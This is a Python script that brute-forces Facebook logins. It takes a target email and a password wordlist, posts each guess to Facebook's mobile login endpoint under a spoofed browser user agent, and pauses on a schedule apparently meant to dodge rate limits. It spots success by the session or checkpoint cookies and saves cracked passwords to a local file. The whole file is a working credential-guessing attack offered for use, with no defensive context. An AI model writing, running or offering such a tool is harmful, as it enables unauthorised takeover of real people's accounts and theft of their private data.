#0755258641

import requests
from sys import argv
from subprocess import call
import colors
from time import sleep
from datetime import datetime , timedelta

c = colors.COLORS()

def calculate_time(passwords):
    number_of_pwd = len(passwords)
    number_of_inter = number_of_pwd // 10
    time = (number_of_pwd * sleep_) + (number_of_inter * 1200)
    time = timedelta(0, time)
    finish_time = datetime.now() + time
    finish_time = '{}H {}M {}S'.format(finish_time.hour, finish_time.minute, finish_time.second)
    return finish_time


def write_data(password):
    with open('found_credentials.txt', 'a') as output_file:
        output_file.write('{}, \t\t {}'.format(argv[1], password))

def login(session, email, passwords, sleep_):
    
    '''
    Attempt to login to Facebook. Returns user ID, xs token and
    fb_dtsg token. All 3 are required to make requests to
    Facebook endpoints as a logged in user. Returns False if
    login failed.
    '''

    # Navigate to Facebook's homepage to load Facebook's cookies.
    response = session.get('https://m.facebook.com')
    
    for index, password in enumerate(passwords):
        # Attempt to login to Facebook
        print("{}[!]{}Checking passwd -> {}".format(c.Yellow, c.RESET, password))

        response = session.post('https://m.facebook.com/login.php', data={
            'email': email,
            'pass': password
        }, allow_redirects=False)
        # If c_user cookie is present, login was successful
        if 'c_user' in response.cookies:
            print('------------------------------------------')
            print('\n{}[✔]{}Password Found -> {}{}{}{}'.format(c.Green, c.RESET, c.BOLD, c.ULINE, password, c.RESET))
            print('{}[✔]{}No Two step verification'.format(c.Green, c.RESET))
            write_data(password)
            break

        elif 'checkpoint' in response.cookies:
            print('------------------------------------------')
            print('\n{}[✔]{}Password Found -> {}{}{}{}'.format(c.Green, c.RESET, c.BOLD, c.ULINE, password, c.RESET))
            print('{}[✘]{}Two step verification required'.format(c.Red, c.RESET))
            write_data(password)
            break

        sleep(int(sleep_))

        if (index % 10 == 0) and (index > 1): 
            sleep(1200)

    print('{}[✘]{}No match found!'.format(c.Red, c.RESET))


if __name__ == "__main__":
    session = requests.session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0'
    })

    try:
        sleep_ = argv[3]
    except IndexError:
        sleep_ = 120
    
    wordlist_path = argv[2]
    user_name = argv[1] 
    with open(wordlist_path, 'r') as passwrods:
        content = passwrods.read().split('\n')

    print("Password cracking started !!!!")
    print('Username ---> {}'.format(user_name))
    print('WordList ---> {}'.format(wordlist_path))
    print('Sleeping ---> {}'.format(sleep_))
    print("ETA --------> {}\n".format(calculate_time(content)))

    login(session, user_name, content, sleep_)
    exit()
